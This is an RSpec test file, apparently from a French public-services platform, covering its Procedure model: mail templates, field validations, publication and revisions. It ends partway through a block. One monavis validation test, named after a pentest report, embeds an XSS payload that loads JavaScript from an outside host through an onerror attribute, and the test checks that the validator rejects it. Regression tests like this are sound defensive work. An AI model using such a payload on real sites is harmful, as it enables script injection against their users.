# frozen_string_literal: true

describe Procedure do
  describe 'mail templates' do
    subject { create(:procedure) }

    it "returns expected classes" do
      expect(subject.passer_en_construction_email_template).to be_a(Mails::InitiatedMail)
      expect(subject.passer_en_instruction_email_template).to be_a(Mails::ReceivedMail)
      expect(subject.accepter_email_template).to be_a(Mails::ClosedMail)
      expect(subject.refuser_email_template).to be_a(Mails::RefusedMail)
      expect(subject.classer_sans_suite_email_template).to be_a(Mails::WithoutContinuationMail)
      expect(subject.repasser_en_instruction_email_template).to be_a(Mails::ReInstructedMail)
    end
  end

  describe 'compute_dossiers_count' do
    let(:procedure) { create(:procedure_with_dossiers, dossiers_count: 2, dossiers_count_computed_at: Time.zone.now - Procedure::DOSSIERS_COUNT_EXPIRING) }

    it 'caches estimated_dossiers_count' do
      procedure.dossiers.each(&:passer_en_construction!)
      expect { procedure.compute_dossiers_count }.to change(procedure, :estimated_dossiers_count).from(nil).to(2)
      expect { create(:dossier, procedure: procedure).passer_en_construction! }.not_to change(procedure, :estimated_dossiers_count)

      travel_to(Time.zone.now + Procedure::DOSSIERS_COUNT_EXPIRING + 1.minute)
      expect { procedure.compute_dossiers_count }.to change(procedure, :estimated_dossiers_count).from(2).to(3)
      travel_back
    end
  end

  describe 'initiated_mail' do
    let(:procedure) { create(:procedure) }

    subject { procedure }

    context 'when initiated_mail is not customize' do
      it { expect(subject.passer_en_construction_email_template.body).to eq(Mails::InitiatedMail.default_for_procedure(procedure).body) }
    end

    context 'when initiated_mail is customize' do
      before :each do
        subject.initiated_mail = Mails::InitiatedMail.new(body: 'sisi')
        subject.save
        subject.reload
      end
      it { expect(subject.passer_en_construction_email_template.body).to eq('sisi') }
    end

    context 'when initiated_mail is customize ... again' do
      before :each do
        subject.initiated_mail = Mails::InitiatedMail.new(body: 'toto')
        subject.save
        subject.reload
      end
      it do
        expect(subject.passer_en_construction_email_template.body).to eq('toto')
        expect(Mails::InitiatedMail.count).to eq(1)
      end
    end
  end

  describe 'closed mail template body' do
    let(:procedure) { create(:procedure, attestation_acceptation_template: attestation_template) }
    let(:attestation_template) { nil }

    subject { procedure.accepter_email_template.rich_body.body.to_html }

    context 'for procedures without an attestation' do
      it { is_expected.not_to include('lien attestation') }
    end

    context 'for procedures with an attestation' do
      let(:attestation_template) { build(:attestation_template, activated: activated) }

      context 'when the attestation is inactive' do
        let(:activated) { false }

        it { is_expected.not_to include('lien attestation') }
      end

      context 'when the attestation is inactive' do
        let(:activated) { true }

        it { is_expected.to include('lien attestation') }
      end
    end
  end

  describe 'refused mail template body' do
    let(:procedure) { create(:procedure, attestation_refus_template: attestation_template) }
    let(:attestation_template) { nil }

    subject { procedure.refuser_email_template.rich_body.body.to_html }

    context 'for procedures without an attestation' do
      it { is_expected.not_to include('lien attestation') }
    end

    context 'for procedures with an attestation' do
      let(:attestation_template) { build(:attestation_template, activated: activated, kind: 'refus') }

      context 'when the attestation is inactive' do
        let(:activated) { false }

        it { is_expected.not_to include('lien attestation') }
      end

      context 'when the attestation is inactive' do
        let(:activated) { true }

        it { is_expected.to include('lien attestation') }
      end
    end
  end

  describe '#mail_template_attestation_inconsistency_state with closed_mail' do
    let(:procedure_without_attestation) { create(:procedure, closed_mail: closed_mail, attestation_acceptation_template: nil) }
    let(:procedure_with_active_attestation) do
      create(:procedure, closed_mail: closed_mail, attestation_acceptation_template: build(:attestation_template, activated: true))
    end
    let(:procedure_with_inactive_attestation) do
      create(:procedure, closed_mail: closed_mail, attestation_acceptation_template: build(:attestation_template, activated: false))
    end

    subject { procedure.mail_template_attestation_inconsistency_state(:acceptation) }

    context 'with a custom mail template' do
      context 'that contains a lien attestation tag' do
        let(:closed_mail) { build(:closed_mail, body: '--lien attestation--') }

        context 'when the procedure doesn’t have an attestation' do
          let(:procedure) { procedure_without_attestation }

          it do
            expect(subject).to eq(:extraneous_tag)
          end
        end

        context 'when the procedure has an active attestation' do
          let(:procedure) { procedure_with_active_attestation }
          it { is_expected.to be_nil }
        end

        context 'when the procedure has an inactive attestation' do
          let(:procedure) { procedure_with_inactive_attestation }

          it do
            expect(subject).to eq(:extraneous_tag)
          end
        end
      end

      context 'that doesn’t contain a lien attestation tag' do
        let(:closed_mail) { build(:closed_mail) }

        context 'when the procedure doesn’t have an attestation' do
          let(:procedure) { procedure_without_attestation }
          it { is_expected.to be_nil }
        end

        context 'when the procedure has an active attestation' do
          let(:procedure) { procedure_with_active_attestation }

          it do
            expect(subject).to eq(:missing_tag)
          end
        end

        context 'when the procedure has an inactive attestation' do
          let(:procedure) { procedure_with_inactive_attestation }
          it { is_expected.to be_nil }
        end
      end
    end
  end

  describe '#mail_template_attestation_inconsistency_state with refused_mail' do
    let(:procedure_without_attestation) { create(:procedure, refused_mail: refused_mail, attestation_refus_template: nil) }
    let(:procedure_with_active_attestation) do
      create(:procedure, refused_mail: refused_mail, attestation_refus_template: build(:attestation_template, activated: true, kind: 'refus'))
    end
    let(:procedure_with_inactive_attestation) do
      create(:procedure, refused_mail: refused_mail, attestation_refus_template: build(:attestation_template, activated: false, kind: 'refus'))
    end

    subject { procedure.mail_template_attestation_inconsistency_state(:refus) }

    context 'with a custom mail template' do
      context 'that contains a lien attestation tag' do
        let(:refused_mail) { build(:refused_mail, body: '--lien attestation--') }

        context 'when the procedure doesn’t have an attestation' do
          let(:procedure) { procedure_without_attestation }

          it do
            expect(subject).to eq(:extraneous_tag)
          end
        end

        context 'when the procedure has an active attestation' do
          let(:procedure) { procedure_with_active_attestation }
          it { is_expected.to be_nil }
        end

        context 'when the procedure has an inactive attestation' do
          let(:procedure) { procedure_with_inactive_attestation }

          it do
            expect(subject).to eq(:extraneous_tag)
          end
        end
      end

      context 'that doesn’t contain a lien attestation tag' do
        let(:refused_mail) { build(:refused_mail) }

        context 'when the procedure doesn’t have an attestation' do
          let(:procedure) { procedure_without_attestation }
          it { is_expected.to be_nil }
        end

        context 'when the procedure has an active attestation' do
          let(:procedure) { procedure_with_active_attestation }

          it do
            expect(subject).to eq(:missing_tag)
          end
        end

        context 'when the procedure has an inactive attestation' do
          let(:procedure) { procedure_with_inactive_attestation }
          it { is_expected.to be_nil }
        end
      end
    end
  end

  describe 'scopes' do
    let!(:procedure) { create(:procedure) }
    let!(:discarded_procedure) { create(:procedure, :discarded) }

    describe 'default_scope' do
      subject { Procedure.all }
      it { is_expected.to match_array([procedure]) }
    end
  end

  describe 'validation' do
    context 'libelle' do
      it do
        is_expected.not_to allow_value(nil).for(:libelle)
        is_expected.not_to allow_value('').for(:libelle)
        is_expected.to allow_value('Demande de subvention').for(:libelle)
      end
    end

    context 'closing procedure' do
      context 'without replacing procedure in DS' do
        let(:procedure) { create(:procedure) }

        context 'valid' do
          before do
            procedure.update!(closing_details: "Bonjour,\nLa démarche est désormais hébergée sur une autre plateforme\nCordialement", closing_reason: Procedure.closing_reasons.fetch(:other))
          end

          it { expect(procedure).to be_valid }
        end
      end
    end

    context 'description' do
      it do
        is_expected.not_to allow_value(nil).for(:description)
        is_expected.not_to allow_value('').for(:description)
        is_expected.to allow_value('Description Demande de subvention').for(:description)
      end
    end

    context 'organisation' do
      it { is_expected.to allow_value('URRSAF').for(:organisation) }
    end

    context 'administrateurs' do
      it { is_expected.not_to allow_value([]).for(:administrateurs) }
    end

    context 'before_remove callback for minimal administrator presence' do
      let(:procedure) { create(:procedure) }

      it 'raises an error when trying to remove the last administrateur' do
        expect(procedure.administrateurs.count).to eq(1)
        expect {
          procedure.administrateurs.destroy(procedure.administrateurs.first)
        }.to raise_error(
          ActiveRecord::RecordNotDestroyed,
          "Cannot remove the last administrateur of procedure #{procedure.libelle} (#{procedure.id})"
        )
      end
    end

    context 'juridique' do
      it do
        is_expected.not_to allow_value(nil).on(:publication).for(:cadre_juridique)
        is_expected.to allow_value('text').on(:publication).for(:cadre_juridique)
      end

      context 'with deliberation' do
        let(:procedure) { build(:procedure, cadre_juridique: nil, revisions: [build(:procedure_revision)]) }

        it { expect(procedure.valid?(:publication)).to eq(false) }

        context 'when the deliberation is uploaded ' do
          before do
            procedure.deliberation = fixture_file_upload('spec/fixtures/files/file.pdf', 'application/pdf')
          end

          it { expect(procedure.valid?(:publication)).to eq(true) }
        end

        context 'when the deliberation is uploaded with an unauthorized format' do
          before do
            procedure.deliberation = fixture_file_upload('spec/fixtures/files/french-flag.gif', 'image/gif')
          end

          it { expect(procedure.valid?(:publication)).to eq(false) }
        end
      end

      context 'when juridique_required is false' do
        let(:procedure) { build(:procedure, juridique_required: false, cadre_juridique: nil) }

        it { expect(procedure.valid?(:publication)).to eq(true) }
      end
    end

    context 'api_particulier_token' do
      let(:valid_token) { "3841b13fa8032ed3c31d160d3437a76a" }
      let(:invalid_token) { 'jet0n 1nvalide' }
      it do
        is_expected.to allow_value(valid_token).for(:api_particulier_token)
        is_expected.not_to allow_value(invalid_token).for(:api_particulier_token)
      end
    end

    context 'monavis' do
      subject { procedure.tap { it.validate(:publication) }.errors.full_messages }

      context 'random string is not allowed' do
        let(:procedure) { build(:procedure, monavis_embed: "plop") }
        it { is_expected.to eq(["Le code MonAvis doit comporter un lien", "Le code MonAvis doit comporter une image"]) }
      end

      context 'random html is not allowed' do
        let(:procedure) { build(:procedure, monavis_embed: '<img src="http://some.analytics/hello.gif">') }
        it { is_expected.to include("Le code MonAvis contient une image pointont vers un domaine invalide") }
      end

      context 'Monavis embed code with white button is allowed' do
        monavis_blanc = <<-MSG
        <a href="https://jedonnemonavis.numerique.gouv.fr/Demarches/123?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=cd4a872d475e4045666057f">
          <img src="https://jedonnemonavis.numerique.gouv.fr/monavis-static/bouton-blanc.png" alt="Je donne mon avis" title="Je donne mon avis sur cette démarche" />
        </a>
        MSG
        let(:procedure) { build(:procedure, monavis_embed: monavis_blanc) }
        it { is_expected.to eq([]) }
      end

      context 'Monavis embed code with blue button is allowed' do
        monavis_bleu = <<-MSG
        <a href="https://jedonnemonavis.numerique.gouv.fr/Demarches/123?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=cd4a872d475e4045666057f">
          <img src="https://jedonnemonavis.numerique.gouv.fr/monavis-static/bouton-bleu.png" alt="Je donne mon avis" title="Je donne mon avis sur cette démarche" />
        </a>
        MSG
        let(:procedure) { build(:procedure, monavis_embed: monavis_bleu) }
        it { is_expected.to eq([]) }
      end

      context 'Monavis embed code with old monavis domain still works (backward compatibility)' do
        monavis_old = <<-MSG
        <a href="https://monavis.numerique.gouv.fr/Demarches/123?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=cd4a872d475e4045666057f">
          <img src="https://monavis.numerique.gouv.fr/monavis-static/bouton-bleu.png" alt="Je donne mon avis" title="Je donne mon avis sur cette démarche" />
        </a>
        MSG
        let(:procedure) { build(:procedure, monavis_embed: monavis_old) }
        it { is_expected.to eq([]) }
      end

      context 'Monavis embed code with voxusages is allowed' do
        monavis_issue_phillipe = <<-MSG
        <a href="https://voxusagers.numerique.gouv.fr/Demarches/3193?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=58e099a09c02abe629c14905ed2b055d">
          <img src="https://monavis.numerique.gouv.fr/monavis-static/bouton-bleu.png" alt="Je donne mon avis" title="Je donne mon avis sur cette démarche" />
        </a>
        MSG
        let(:procedure) { build(:procedure, monavis_embed: monavis_issue_phillipe) }
        it { is_expected.to eq([]) }
      end

      context 'Monavis embed code without title allowed' do
        monavis_issue_bouchra = <<-MSG
          <a href="https://voxusagers.numerique.gouv.fr/Demarches/3193?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=58e099a09c02abe629c14905ed2b055d">
            <img src="https://voxusagers.numerique.gouv.fr/static/bouton-bleu.svg" alt="Je donne mon avis" />
          </a>
        MSG
        let(:procedure) { build(:procedure, monavis_embed: monavis_issue_bouchra) }
        it { is_expected.to eq([]) }
      end

      context 'Monavis embed code with jedonnemonavis' do
        monavis_jedonnemonavis = <<-MSG
          <a href="https://jedonnemonavis.numerique.gouv.fr/Demarches/3839?&view-mode=formulaire-avis&nd_source=button&key=6af80846f64fb213abcabaeea7a3ea8c">
            <img src="https://jedonnemonavis.numerique.gouv.fr/static/bouton-bleu.svg" alt="Je donne mon avis" />
          </a>
        MSG
        let(:procedure) { build(:procedure, monavis_embed: monavis_jedonnemonavis) }
        it { is_expected.to eq([]) }
      end

      context 'Monavis embed code with kthxbye' do
        monavis_jedonnemonavis = <<-MSG
          <a href="https://kthxbye.fr/?key=6af80846f64fb213abcabaeea7a3ea8c">
            <img src="https://kthxbye.fr/static/bouton-bleu.svg" alt="Je donne mon avis" />
          </a>
        MSG
        let(:procedure) { build(:procedure, monavis_embed: monavis_jedonnemonavis) }
        it { is_expected.to eq(["Le code MonAvis contient un lien pointant vers un domaine invalide"]) }
      end

      context 'when YWH-PGM5381-46 pentester won' do
        monavis_ywh_pgm5381_46 = <<-MSG
         <a href="https://monavis.numerique.gouv.fr/Demarches/123456?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=cd4a872d4"></a>
         <img src="https://monavis.numerique.gouv.fr/monavis-static/bouton-bleu.pngx" alt="x" onerror=import('https://hks.ec/ATOXSS-ze4fzfze54.js') />
        MSG
        let(:procedure) { build(:procedure, monavis_embed: monavis_ywh_pgm5381_46) }
        it { is_expected.to eq(["Le code MonAvis contient un attribut interdit : onerror"]) }
      end
    end

    describe 'duree de conservation dans ds' do
      let(:field_name) { :duree_conservation_dossiers_dans_ds }
      context 'by default is caped to 12' do
        subject { create(:procedure, duree_conservation_dossiers_dans_ds: 12, max_duree_conservation_dossiers_dans_ds: 12) }
        it do
          is_expected.not_to allow_value(nil).for(field_name)
          is_expected.not_to allow_value('').for(field_name)
          is_expected.not_to allow_value('trois').for(field_name)
          is_expected.to allow_value(3).for(field_name)
          is_expected.to validate_numericality_of(field_name).is_less_than_or_equal_to(12)
        end
      end
      context 'can be over riden' do
        subject { create(:procedure, duree_conservation_dossiers_dans_ds: 60, max_duree_conservation_dossiers_dans_ds: 60) }
        it do
          is_expected.not_to allow_value(nil).for(field_name)
          is_expected.not_to allow_value('').for(field_name)
          is_expected.not_to allow_value('trois').for(field_name)
          is_expected.to allow_value(3).for(field_name)
          is_expected.to allow_value(60).for(field_name)
          is_expected.to validate_numericality_of(field_name).is_less_than_or_equal_to(60)
        end
      end
    end

    describe 'draft_types_de_champ validations' do
      let(:procedure) { create(:procedure, types_de_champ_public:, types_de_champ_private:) }

      context 'on a draft procedure' do
        let(:types_de_champ_private) { [] }
        let(:types_de_champ_public) { [{ type: :repetition, libelle: 'Enfants', children: [] }] }

        it 'doesn’t validate the types de champs' do
          procedure.validate
          expect(procedure.errors[:draft_types_de_champ_public]).not_to be_present
        end
      end

      context 'when validating for publication' do
        let(:types_de_champ_public) do
          [
            { type: :repetition, libelle: 'Enfants', children: [] },
            { type: :drop_down_list, libelle: 'Civilité', options: [] },
          ]
        end
        let(:types_de_champ_private) { [] }
        let(:invalid_repetition_error_message) { "doit comporter au moins un champ répétable" }
        let(:invalid_drop_down_error_message) { "doit comporter au moins un choix sélectionnable" }

        it 'validates that no repetition type de champ is empty' do
          procedure.validate(:publication)
          expect(procedure.errors.messages_for(:draft_types_de_champ_public)).to include(invalid_repetition_error_message)

          new_draft = procedure.draft_revision
          repetition = new_draft.types_de_champ_public.find(&:repetition?)
          new_draft.add_type_de_champ(type_champ: :text, libelle: 'Nom', parent_stable_id: repetition.stable_id)

          procedure.validate(:publication)
          expect(procedure.errors.messages_for(:draft_types_de_champ_public)).not_to include(invalid_repetition_error_message)
        end

        it 'validates that no drop-down type de champ is empty' do
          drop_down = procedure.draft_revision.types_de_champ_public.find(&:any_drop_down_list?)

          drop_down.update!(drop_down_options: [])
          procedure.reload.validate(:publication)
          expect(procedure.errors.messages_for(:draft_types_de_champ_public)).to include(invalid_drop_down_error_message)

          drop_down.update!(drop_down_options: ["--title--", "some value"])
          procedure.reload.validate(:publication)
          expect(procedure.errors.messages_for(:draft_types_de_champ_public)).not_to include(invalid_drop_down_error_message)
        end

        context 'validates formatted champ character rules' do
          let(:types_de_champ_private) { [] }
          let(:formatted_mode) { "simple" }
          let(:letters_accepted) { "1" }
          let(:numbers_accepted) { "0" }
          let(:special_characters_accepted) { "0" }
          let(:types_de_champ_public) do
            [
              { type: :formatted, formatted_mode:, letters_accepted:, numbers_accepted:, special_characters_accepted: },
            ]
          end

          it 'accepts valid character rules' do
            expect(procedure.valid?(:publication)).to be_truthy
          end

          context "all rules are disabled" do
            let(:letters_accepted) { "0" }
            it 'publication is invalid' do
              expect(procedure.invalid?(:publication)).to be_truthy

              expect(procedure.errors.messages_for(:draft_types_de_champ_public).first).to include("au moins un type de caractère")
            end
          end
        end

        context 'validates formatted champ character length' do
          let(:types_de_champ_private) { [] }
          let(:formatted_mode) { "simple" }
          let(:min_character_length) { "3" }
          let(:max_character_length) { "10" }
          let(:types_de_champ_public) do
            [
              { type: :formatted, formatted_mode:, min_character_length:, max_character_length: },
            ]
          end

          it 'accepts valid character length rules' do
            expect(procedure.valid?(:publication)).to be_truthy
          end

          context "when min > max" do
            let(:min_character_length) { "20" }

            it 'publication is invalid' do
              expect(procedure.invalid?(:publication)).to be_truthy
              expect(procedure.errors.messages_for(:draft_types_de_champ_public).first).to include("inférieur au nombre maximum de caractères")
            end
          end

          context "when max is empty" do
            let(:max_character_length) { "" }
            it 'is valid' do
              expect(procedure.valid?(:publication)).to be_truthy
            end
          end
        end
      end

      context 'when the champ is private' do
        let(:types_de_champ_private) do
          [
            { type: :repetition, libelle: 'Enfants', children: [] },
            { type: :drop_down_list, libelle: 'Civilité', options: [] },
          ]
        end
        let(:types_de_champ_public) { [] }

        let(:invalid_repetition_error_message) { "doit comporter au moins un champ répétable" }
        let(:invalid_drop_down_error_message) { "doit comporter au moins un choix sélectionnable" }

        it 'validates that no repetition type de champ is empty' do
          procedure.validate(:publication)
          expect(procedure.errors.messages_for(:draft_types_de_champ_private)).to include(invalid_repetition_error_message)

          repetition = procedure.draft_revision.types_de_champ_private.find(&:repetition?)
          expect(procedure.errors.to_enum.to_a.map { _1.options[:type_de_champ] }).to include(repetition)
        end

        it 'validates that no drop-down type de champ is empty' do
          drop_down = procedure.draft_revision.types_de_champ_private.find(&:any_drop_down_list?)
          drop_down.update!(drop_down_options: [])
          procedure.reload.validate(:publication)

          expect(procedure.errors.messages_for(:draft_types_de_champ_private)).to include(invalid_drop_down_error_message)
          expect(procedure.errors.to_enum.to_a.map { _1.options[:type_de_champ] }).to include(drop_down)
        end
      end

      context 'when condition on champ private use public champ' do
        include Logic
        let(:types_de_champ_public) { [{ type: :decimal_number, stable_id: 1 }] }
        let(:types_de_champ_private) { [{ type: :text, condition: ds_eq(champ_value(1), constant(2)), stable_id: 2 }] }
        it 'validate without context' do
          procedure.validate
          expect(procedure.errors.full_messages_for(:draft_types_de_champ_private)).to be_empty
        end

        it 'validate allows condition' do
          procedure.validate(:types_de_champ_private_editor)
          expect(procedure.errors.full_messages_for(:draft_types_de_champ_private)).to be_empty
        end
      end

      context 'when condition on champ private use public champ having a position higher than the champ private' do
        include Logic

        let(:types_de_champ_public) do
          [
            { type: :decimal_number, stable_id: 1 },
            { type: :decimal_number, stable_id: 2 },
          ]
        end

        let(:types_de_champ_private) do
          [
            { type: :text, condition: ds_eq(champ_value(2), constant(2)), stable_id: 3 },
          ]
        end

        it 'validate without context' do
          procedure.validate
          expect(procedure.errors.full_messages_for(:draft_types_de_champ_private)).to be_empty
        end

        it 'validate allows condition' do
          procedure.validate(:types_de_champ_private_editor)
          expect(procedure.errors.full_messages_for(:draft_types_de_champ_private)).to be_empty
        end
      end

      context 'when condition on champ public use private champ' do
        include Logic
        let(:types_de_champ_public) { [{ type: :text, libelle: 'condition', condition: ds_eq(champ_value(1), constant(2)), stable_id: 2 }] }
        let(:types_de_champ_private) { [{ type: :decimal_number, stable_id: 1 }] }
        let(:error_on_condition) { "Le champ a une logique conditionnelle invalide" }

        it 'validate without context' do
          procedure.validate
          expect(procedure.errors.full_messages_for(:draft_types_de_champ_public)).to be_empty
        end

        it 'validate prevent condition' do
          procedure.validate(:types_de_champ_public_editor)
          expect(procedure.errors.full_messages_for(:draft_types_de_champ_public)).to include(error_on_condition)
        end
      end
    end

    context 'with auto archive' do
      let(:procedure) { create(:procedure, auto_archive_on: 1.day.from_now) }

      it { expect(procedure).to be_valid }

      context 'when auto_archive_on is in the past' do
        it 'validates only when attribute is changed' do
          procedure.auto_archive_on = 1.day.ago
          expect(procedure).not_to be_valid

          procedure.save!(validate: false)
          expect(procedure).to be_valid
        end
      end
    end

    context 'with sva svr' do
      before {
        procedure.sva_svr["decision"] = "svr"
      }

      context 'when procedure is published with sva' do
        let(:procedure) { create(:procedure, :published, :sva) }

        it 'prevents changes to sva_svr' do
          expect(procedure).not_to be_valid
          expect(procedure.errors[:sva_svr].join).to include('ne peut plus être modifiée')
        end
      end

      context 'when procedure is published without sva' do
        let(:procedure) { create(:procedure, :published) }

        it 'allow activation' do
          expect(procedure).to be_valid
        end

        it 'allow activation from disabled value' do
          procedure.sva_svr["decision"] = "disabled"
          procedure.save!

          procedure.sva_svr["decision"] = "svr"

          expect(procedure).to be_valid
        end
      end

      context 'brouillon procedure' do
        let(:procedure) { create(:procedure, :sva) }

        it "can update sva config" do
          expect(procedure).to be_valid
        end
      end

      context "with declarative" do
        let(:procedure) { create(:procedure, declarative_with_state: "accepte") }

        it 'is not valid' do
          expect(procedure).not_to be_valid
          expect(procedure.errors[:sva_svr].join).to include('incompatible avec une démarche déclarative')
        end
      end
    end
  end

  describe 'opendata' do
    let(:procedure) { create(:procedure) }

    it 'is true by default' do
      expect(procedure.opendata).to be_truthy
    end
  end

  describe 'publiques' do
    let(:draft_procedure) { create(:procedure_with_dossiers, :draft, estimated_dossiers_count: 4, lien_site_web: 'https://monministere.gouv.fr/cparici') }
    let(:published_procedure) { create(:procedure_with_dossiers, :published, estimated_dossiers_count: 4, lien_site_web: 'https://monministere.gouv.fr/cparici') }
    let(:published_procedure_no_opendata) { create(:procedure_with_dossiers, :published, estimated_dossiers_count: 4, opendata: false) }
    let(:published_procedure_with_3_dossiers) { create(:procedure_with_dossiers, :published, estimated_dossiers_count: 3) }
    let(:published_procedure_with_mail) { create(:procedure_with_dossiers, :published, estimated_dossiers_count: 4, lien_site_web: 'par mail') }
    let(:published_procedure_with_intra) { create(:procedure_with_dossiers, :published, estimated_dossiers_count: 4, lien_site_web: 'https://intra.service-etat.gouv.fr') }

    it 'returns published procedure, with opendata flag, with accepted lien_site_web' do
      expect(Procedure.publiques).not_to include(published_procedure_no_opendata)
    end

    it "returns only published or closed procedures" do
      expect(Procedure.publiques).not_to include(draft_procedure)
    end

    it "returns only procedures with opendata flag" do
      expect(Procedure.publiques).not_to include(published_procedure_with_mail)
    end

    it "returns only procedures without mail in lien_site_web" do
      expect(Procedure.publiques).not_to include(published_procedure_with_mail)
    end

    it "returns only procedures without intra in lien_site_web" do
      expect(Procedure.publiques).not_to include(published_procedure_with_intra)
    end

    it "does not return procedures with less than 4 dossiers" do
      expect(Procedure.publiques).not_to include(published_procedure_with_3_dossiers)
    end
  end

  describe 'active' do
    let(:procedure) { create(:procedure) }
    subject { Procedure.active(procedure.id) }

    context 'when procedure is in draft status and not closed' do
      it { expect { subject }.to raise_error(ActiveRecord::RecordNotFound) }
    end

    context 'when procedure is published and not closed' do
      let(:procedure) { create(:procedure, :published) }
      it { is_expected.to be_truthy }
    end

    context 'when procedure is published and closed' do
      let(:procedure) { create(:procedure, :closed) }
      it { expect { subject }.to raise_error(ActiveRecord::RecordNotFound) }
    end
  end

  describe '#publish!' do
    let(:procedure) { create(:procedure, path: 'example-path', zones: [create(:zone)]) }
    let(:now) { Time.zone.now.beginning_of_minute }

    context 'when publishing a new procedure' do
      before do
        travel_to(now) do
          procedure.publish!(procedure.administrateurs.first)
        end
      end

      it 'no reference to the canonical procedure on the published procedure' do
        expect(procedure.canonical_procedure).to be_nil
      end

      it 'changes the procedure state to published' do
        expect(procedure.closed_at).to be_nil
        expect(procedure.published_at).to eq(now)
        expect(Procedure.find_with_path("example-path").first).to eq(procedure)
        expect(Procedure.find_with_path("example-path").first.administrateurs).to eq(procedure.administrateurs)
      end

      it 'creates a new draft revision' do
        expect(procedure.published_revision).not_to be_nil
        expect(procedure.draft_revision).not_to be_nil
        expect(procedure.revisions.count).to eq(2)
        expect(procedure.revisions).to eq([procedure.published_revision, procedure.draft_revision])
      end
    end

    context 'when publishing over a previous canonical procedure' do
      let(:canonical_procedure) { create(:procedure, :published) }

      before do
        travel_to(now) do
          procedure.publish!(procedure.administrateurs.first, canonical_procedure)
        end
      end

      it 'references the canonical procedure on the published procedure' do
        expect(procedure.canonical_procedure).to eq(canonical_procedure)
      end

      it 'changes the procedure state to published' do
        expect(procedure.closed_at).to be_nil
        expect(procedure.published_at).to eq(now)
      end
    end
  end

  describe "#publish_or_reopen!" do
    let(:canonical_procedure) { create(:procedure, :published) }
    let(:administrateur) { canonical_procedure.administrateurs.first }

    let(:procedure) { create(:procedure, administrateurs: [administrateur], zones: [create(:zone)]) }
    let(:now) { Time.zone.now.beginning_of_minute }

    context 'when publishing over a previous canonical procedure' do
      before do
        travel_to(now) do
          procedure.publish_or_reopen!(administrateur, canonical_procedure.path)
        end
        procedure.reload
        canonical_procedure.reload
      end

      it 'references the canonical procedure on the published procedure' do
        expect(procedure.canonical_procedure).to eq(canonical_procedure)
      end

      it 'changes the procedure state to published' do
        expect(procedure.closed_at).to be_nil
        expect(procedure.published_at).to eq(now)
      end

      it 'unpublishes the canonical procedure' do
        expect(canonical_procedure.unpublished_at).to eq(now)
      end

      it 'creates a new draft revision' do
        expect(procedure.published_revision).not_to be_nil
        expect(procedure.draft_revision).not_to be_nil
        expect(procedure.revisions.count).to eq(2)
        expect(procedure.revisions).to eq([procedure.published_revision, procedure.draft_revision])
        expect(procedure.published_revision.published_at).to eq(now)
      end
    end

    context 'when publishing over a previous procedure with canonical procedure' do
      let(:canonical_path) { 'canonical-path' }
      let(:canonical_procedure) { create(:procedure, :closed, path: canonical_path) }
      let(:parent_procedure) { create(:procedure, :published, administrateurs: [administrateur]) }

      before do
        parent_procedure.update!(canonical_procedure: canonical_procedure)
        parent_procedure.claim_path!(administrateur, canonical_path)
        travel_to(now) do
          procedure.publish_or_reopen!(administrateur, canonical_path)
        end
        parent_procedure.reload
      end

      it 'references the canonical procedure on the published procedure' do
        expect(procedure.canonical_procedure).to eq(canonical_procedure)
      end

      it 'changes the procedure state to published' do
        expect(procedure.canonical_procedure).to eq(canonical_procedure)
        expect(procedure.closed_at).to be_nil
        expect(procedure.published_at).to eq(now)
        expect(procedure.published_revision.published_at).to eq(now)
      end

      it 'unpublishes parent procedure' do
        expect(parent_procedure.unpublished_at).to eq(now)
      end
    end

    context 'when republishing a previously closed procedure' do
      let(:procedure) { create(:procedure, :published, administrateurs: [administrateur]) }

      before do
        procedure.close!
        travel_to(now) do
          procedure.publish_or_reopen!(administrateur, procedure.path)
        end
      end

      it 'changes the procedure state to published' do
        expect(procedure.closed_at).to be_nil
        expect(procedure.published_at).to eq(now)
        expect(procedure.published_revision.published_at).not_to eq(now)
      end

      it "doesn't create a new revision" do
        expect(procedure.published_revision).not_to be_nil
        expect(procedure.draft_revision).not_to be_nil
        expect(procedure.revisions.count).to eq(2)
        expect(procedure.revisions).to eq([procedure.published_revision, procedure.draft_revision])
      end
    end

    context 'when publishing a procedure with the same path as another procedure from another admin' do
      let(:procedure) { create(:procedure, path: 'example-path', administrateurs: [administrateur]) }
      let(:other_procedure) { create(:procedure, path: 'example-path', administrateurs: [create(:administrateur)]) }

      it 'raises an error' do
        expect { procedure.publish_or_reopen!(administrateur, other_procedure.path) }.to raise_error(ActiveRecord::RecordInvalid)
      end
    end
  end

  describe "#publish_revision!" do
    let(:administrateur) { create(:administrateur) }
    let(:procedure) { create(:procedure, :published, administrateurs: [administrateur]) }
    let(:tdc_attributes) { { type_champ: :number, libelle: 'libelle 1' } }
    let(:publication_date) { Time.zone.local(2021, 1, 1, 12, 00, 00) }

    before do
      procedure.draft_revision.add_type_de_champ(tdc_attributes)
    end

    subject do
      travel_to(publication_date) do
        procedure.publish_revision!(administrateur)
      end
    end

    it 'publishes the new revision' do
      subject
      expect(procedure.published_revision).to be_present
      expect(procedure.published_revision.published_at).to eq(publication_date)
      expect(procedure.published_revision.types_de_champ_public.first.libelle).to eq('libelle 1')
    end

    it 'creates a new draft revision' do
      expect { subject }.to change(ProcedureRevision, :count).by(1)
      expect(procedure.draft_revision).to be_present
      expect(procedure.draft_revision.revision_types_de_champ_public).to be_present
      expect(procedure.draft_revision.types_de_champ_public).to be_present
      expect(procedure.draft_revision.types_de_champ_public.first.libelle).to eq('libelle 1')
    end

    it 'records the publishing administrateur' do
      subject

      expect(procedure.published_revision.administrateur).to eq(administrateur)
      expect(procedure.draft_revision.administrateur).to be_nil
    end

    context 'when the procedure has dossiers' do
      let(:dossier_draft) { create(:dossier, :brouillon, procedure: procedure) }
      let(:dossier_submitted) { create(:dossier, :en_construction, procedure: procedure) }
      let(:dossier_termine) { create(:dossier, :accepte, procedure: procedure) }

      before { [dossier_draft, dossier_submitted, dossier_termine] }

      it 'enqueues rebase jobs for draft dossiers' do
        subject
        expect(DossierRebaseJob).to have_been_enqueued.with(dossier_draft)
        expect(DossierRebaseJob).to have_been_enqueued.with(dossier_submitted)
        expect(DossierRebaseJob).not_to have_been_enqueued.with(dossier_termine)
      end
    end

